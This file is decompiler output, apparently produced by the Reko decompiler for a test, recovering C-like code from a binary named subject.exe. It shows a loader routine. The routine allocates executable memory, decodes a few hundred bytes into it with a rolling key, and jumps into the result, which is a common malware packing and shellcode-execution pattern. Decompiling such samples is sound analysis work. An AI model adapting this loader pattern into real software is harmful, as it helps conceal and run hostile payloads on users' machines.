// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040BBDC: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax_12 = IsWindow(dwArg04);
	if (eax_12 == 0x00)
		eax_12 = fn0040BC18((byte) GetPrivateProfileIntA(fp - 0x08, fp - 0x08, 0xF3, fp - 0x08));
	return eax_12;
}

// 0040BC18: Register word32 fn0040BC18(Register byte bl)
word32 fn0040BC18(byte bl)
{
	word32 ecx_17 = 0x01E3;
	word32 * esp_112 = fp - 0x14;
	union Eq_36 * esi_22 = (union Eq_36 *) 0xA8;
	Eq_38 edi_23 = VirtualAlloc(0x00, 83886, 0x3000, 0x40);
	uint32 edx_28 = DPB(1361099513, bl + ~0x06, 0);
	word32 ebp_101 = 0x00;
l0040BC54:
	uint32 * esp_42 = esp_112 - 0x04;
	*esp_42 = edx_28;
	*(esp_42 - 0x04) = ecx_17;
	*edi_23 = (word32) *edi_23 + (byte) ((char *) (*esi_22) + *esp_42);
	word32 ebp_65 = ebp_101 + 259622;
	uint32 edx_58 = *esp_42;
	word32 ecx_55 = *(esp_42 - 0x04);
	esp_112 = esp_42 + 0x01;
	esi_22 = (union Eq_36 *) ((char *) esi_22 + 0x01);
	edi_23 = edi_23 + 0x01;
	ebp_101 = ebp_65 - 259621;
	uint32 edx_110 = edx_58 >> 0x08;
	byte dl_111 = (byte) (edx_58 >> 0x08);
	if (0x04 == ebp_65 - 259621)
	{
		*esp_42 = 1361099513;
		edx_110 = *esp_42;
		dl_111 = (byte) edx_110;
		esp_112 = esp_42 + 0x01;
		ebp_101 = 0x00;
	}
	do
	{
		byte dl_81 = dl_111 + bl;
		word32 ecx_83 = ecx_55 - 0x00045E41;
		edx_28 = DPB(edx_110, dl_81, 0);
		ecx_17 = ecx_83 + 286272;
		if (ecx_83 != 286272)
			goto l0040BC54;
		<anonymous> * eax_89 = *esp_112;
		word32 eax_93;
		byte SCZO_95;
		byte cl_102;
		byte SZO_103;
		byte C_104;
		byte Z_105;
		eax_89();
	} while (false);
	return eax_93;
}

